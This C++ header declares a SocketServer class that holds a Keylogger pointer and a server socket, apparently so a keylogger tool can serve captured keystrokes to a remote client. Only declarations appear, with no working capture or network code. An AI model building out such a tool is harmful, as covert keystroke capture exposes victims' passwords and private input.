#pragma once

#include "Keylogger.h"

#define SOCKET_BUFFER_SIZE 1024

class SocketServer {
private:
	Keylogger* logger;
	SOCKET serverSocket;
public:
	SocketServer();
	~SocketServer();
	void start();
	std::wstring getResponse(std::wstring request);
};

